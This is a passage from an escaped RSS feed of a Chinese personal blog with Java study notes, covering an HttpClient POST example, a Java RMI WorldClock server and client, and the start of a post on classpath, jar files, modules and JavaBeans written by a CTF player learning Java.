&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>post&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://www.example.com/login&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;username=bob&amp;amp;password=123456&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置超时:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置版本:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 使用POST并设置Body:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">POST&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BodyPublishers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">body&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="rmi">RMI&lt;/h3>
&lt;p>一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法&lt;/p>
&lt;p>要实现RMI，服务器和客户端必须共享同一个接口interface，测试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">WorldClock&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此接口必须派生自&lt;code>java.rmi.Remote&lt;/code>，并在每个方法声明抛出&lt;code>RemoteException&lt;/code>&lt;/p>
&lt;p>下一步是编写服务器的实现类，因为客户端请求的调用方法&lt;code>getLocalDateTime()&lt;/code>最终会通过这个实现类返回结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">WorldClockService&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">now&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ZoneId&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">withNano&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在需要通过Java RMI提供的一系列底层支持接口，把上面编写的服务以RMI的形式暴露在网络上，客户端才能调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;create World clock remote service...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实例化一个WorldClock:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">WorldClockService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将此服务转换为远程服务接口:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">skeleton&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exportObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将RMI服务注册到1099端口:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 注册此服务，服务名为&amp;#34;WorldClock&amp;#34;:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">skeleton&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于RMI要求服务器和客户端共享同一个接口，因此我们要把&lt;code>WorldClock.java&lt;/code>这个接口文件复制到客户端，然后在客户端实现RMI调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">NotBoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 连接到服务器localhost，端口1099:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 查找名称为&amp;#34;WorldClock&amp;#34;的服务并强制转型为WorldClock接口:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 正常调用接口方法:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#111">now&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Asia/Shanghai&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 打印调用结果:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对客户端来说，客户端持有的&lt;code>WorldClock&lt;/code>接口实际上对应了一个“实现类”，它是由&lt;code>Registry&lt;/code>内部动态生成的，并负责把方法调用通过网络传递到服务器端。而服务器端接收网络调用的服务并不是我们自己编写的&lt;code>WorldClockService&lt;/code>，而是&lt;code>Registry&lt;/code>自动生成的代码。我们把客户端的“实现类”称为&lt;code>stub&lt;/code>，而服务器端的网络服务类称为&lt;code>skeleton&lt;/code>，它会真正调用服务器端的&lt;code>WorldClockService&lt;/code>，获取结果，然后把结果通过网络传递给客户端&lt;/p>
&lt;p>RMI通过自动生成stub和skeleton实现网络调用，客户端只需要查找服务并获得接口实例，服务器端只需要编写实现类并注册为服务&lt;/p>
&lt;p>整个过程由RMI底层负责实现序列化和反序列化，很容易产生安全问题&lt;/p>
&lt;hr>
&lt;p>其它的语法等遇到了再学，估计还会有个Java语法补全下篇（如果我不懒的话&lt;/p></description></item><item><title>Java学习笔记Ⅰ</title><link>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</link><pubDate>Sun, 27 Feb 2022 01:28:17 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</guid><description>&lt;p>ctf里有几类题我是见到之后拔腿就跑，比如java和xss，对于后者，最近杂七杂八的学了很多js和前端的知识 没那么发怵了，而前者……不多说了，学学学！&lt;/p>
&lt;p>本篇学习内容来自于&lt;a href="https://www.liaoxuefeng.com/wiki/1252599548343744">廖雪峰Java教程&lt;/a>，个人感觉比较适合对其它语言也有一点掌握的人&lt;/p>
&lt;p>本机win10，为了兼容一些程序暂时有java8和11两个版；ide使用idea&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220226170711379.png" alt="image-20220226170711379">&lt;/p>
&lt;hr>
&lt;h2 id="java基础">Java基础&lt;/h2>
&lt;h3 id="java程序结构">java程序结构&lt;/h3>
&lt;ul>
&lt;li>src/xxx.java，类名为文件名，main为入口（idea直接输main会自动补全），idea格式化代码ctrl+shift+F&lt;/li>
&lt;li>类class习惯大写字母开头，方法method习惯小写字母开头，必须带分号（不同于js可有可无）&lt;/li>
&lt;/ul>
&lt;h3 id="classpathjar">classpath&amp;amp;jar&lt;/h3>
&lt;ul>
&lt;li>&lt;code>classpath&lt;/code>是JVM的环境变量，是一组目录的集合（分隔符由系统定&lt;/li>
&lt;li>推荐在启动JVM时设置&lt;code>classpath&lt;/code>变量，不要污染系统环境（可以放心的交给idea&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -classpath .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>java -cp .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>不要把任何Java核心库添加到classpath中！默认的当前目录&lt;code>.&lt;/code>对于绝大多数情况都够用&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jar包实际上就是一个zip格式的压缩文件，包含&lt;code>package&lt;/code>组织的目录层级，以及各个目录下的所有文件（包括&lt;code>.class&lt;/code>文件和其他文件），注意不含&lt;code>bin&lt;/code>目录（注意层级）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>可以把jar理解为n多个class文件的容器，JVM自带的Java标准库rt.jar也是以jar形式进行存放&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jar不关心class之间的依赖，如果漏掉的话在运行期极有可能抛出&lt;code>ClassNotFoundException&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果我们要执行一个jar包的&lt;code>class&lt;/code>，就可以把jar包放到&lt;code>classpath&lt;/code>中&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -cp ./hello.jar abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>MANIFEST.MF&lt;/code>文件可以提供jar包的信息，如&lt;code>Main-Class&lt;/code>&lt;/li>
&lt;li>分析题目中给出jar包时我一般直接改zip解压，用idea打开整个目录作为项目（idea yyds&lt;/li>
&lt;/ul>
&lt;h3 id="模块">模块&lt;/h3>
&lt;ul>
&lt;li>Java9后引入，解决依赖问题，控制jar之间的相互调用&lt;/li>
&lt;li>把一堆class封装为jar仅仅是一个打包的过程，而把一堆class封装为模块则不但需要打包，还需要写入依赖关系，并且还可以包含二进制代码（通常是JNI扩展）&lt;/li>
&lt;li>以java的标准库rt.jar为例，被拆为&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>java.base.jmod
java.compiler.jmod
java.datatransfer.jmod
java.desktop.jmod
...
&lt;/code>&lt;/pre>&lt;p>以&lt;code>.jmod&lt;/code>为拓展名标识，每个文件都是一个模块，模块&lt;code>java.base&lt;/code>对应的文件就是&lt;code>java.base.jmod&lt;/code>&lt;/p>
&lt;ul>
&lt;li>模块之间的依赖关系已经被写入到模块内的&lt;code>module-info.class&lt;/code>文件了。所有的模块都直接或间接地依赖&lt;code>java.base&lt;/code>模块，只有&lt;code>java.base&lt;/code>模块不依赖任何模块，它可以被看作是根模块，好比所有的类都是从&lt;code>Object&lt;/code>直接或间接继承而来&lt;/li>
&lt;/ul>
&lt;p>编写模块的部分暂略。&lt;/p>
&lt;h3 id="javabean">JavaBean&lt;/h3>
&lt;p>指的是符合某种规范的一种编程模式或编程思想（个人理解&lt;/p>
&lt;p>部分Python爱好者也喜欢这么写，可拓展性强，就是很臃肿&lt;/p>
&lt;ul>
&lt;li>写方法&lt;code>setter&lt;/code>，读方法&lt;code>getter&lt;/code>，只有其中一种属性之一的被称为只写/读属性——满足这样规范的class被称为JavaBean&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 读方法:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#75af00">getXyz&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写方法:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setXyz&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的&lt;code>Introspector&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.beans.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">BeanInfo&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Introspector&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBeanInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取属性列表
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">PropertyDescriptor&lt;/span> &lt;span style="color:#111">pd&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">info&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPropertyDescriptors&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
